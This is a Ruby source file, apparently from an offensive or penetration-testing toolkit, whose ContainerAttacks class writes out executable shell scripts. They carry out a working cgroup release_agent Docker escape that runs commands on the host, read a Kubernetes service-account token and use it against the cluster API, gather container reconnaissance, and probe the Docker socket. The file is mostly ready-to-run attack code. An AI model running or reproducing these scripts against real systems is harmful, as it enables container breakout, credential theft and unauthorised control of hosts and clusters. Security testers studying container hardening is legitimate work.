require_relative '../utils/colorize'

class ContainerAttacks
  def self.test_docker_escape
    escape = <<~SH
      #!/bin/bash
      
      if [ -f /.dockerenv ]; then
          echo "Inside Docker container"
          
          mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
          echo 1 > /tmp/cgrp/x/notify_on_release
          host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`
          echo "$host_path/cmd" > /tmp/cgrp/release_agent
          echo '#!/bin/sh' > /cmd
          echo "id > $host_path/output" >> /cmd
          chmod a+x /cmd
          sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"
          sleep 1
          cat /output
      else
          echo "Not in Docker container"
      fi
    SH
    
    filename = "docker_escape_#{Time.now.to_i}.sh"
    File.write(filename, escape)
    File.chmod(filename, 0755)
    puts Colorize.green("Docker escape script saved: #{filename}")
    filename
  end

  def self.test_kubernetes_escape
    escape = <<~SH
      #!/bin/bash
      
      if [ -f /var/run/secrets/kubernetes.io ]; then
          echo "Inside Kubernetes pod"
          
          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
          NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
          
          curl -k --cacert $CA -H "Authorization: Bearer $TOKEN" \
              https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods
      else
          echo "Not in Kubernetes pod"
      fi
    SH
    
    filename = "k8s_escape_#{Time.now.to_i}.sh"
    File.write(filename, escape)
    File.chmod(filename, 0755)
    puts Colorize.green("Kubernetes escape script saved: #{filename}")
    filename
  end

  def self.generate_container_breakout
    breakout = <<~SH
      #!/bin/bash
      
      echo "=== Container Information ===" > container_info.txt
      cat /proc/self/cgroup >> container_info.txt 2>/dev/null
      cat /.dockerenv >> container_info.txt 2>/dev/null
      mount | grep docker >> container_info.txt 2>/dev/null
      
      echo "" >> container_info.txt
      echo "=== Capabilities ===" >> container_info.txt
      capsh --print >> container_info.txt 2>/dev/null
      
      echo "" >> container_info.txt
      echo "=== Network ===" >> container_info.txt
      ip addr >> container_info.txt 2>/dev/null
      
      echo "" >> container_info.txt
      echo "=== Processes ===" >> container_info.txt
      ps aux >> container_info.txt 2>/dev/null
      
      cat container_info.txt
    SH
    
    filename = "container_breakout_#{Time.now.to_i}.sh"
    File.write(filename, breakout)
    File.chmod(filename, 0755)
    puts Colorize.green("Container breakout script saved: #{filename}")
    filename
  end

  def self.test_docker_socket_access
    test = <<~SH
      #!/bin/bash
      
      if [ -S /var/run/docker.sock ]; then
          echo "Docker socket accessible"
          docker ps
          docker images
          docker network ls
      else
          echo "Docker socket not accessible"
      fi
    SH
    
    filename = "docker_socket_test_#{Time.now.to_i}.sh"
    File.write(filename, test)
    File.chmod(filename, 0755)
    puts Colorize.green("Docker socket test saved: #{filename}")
    filename
  end
end

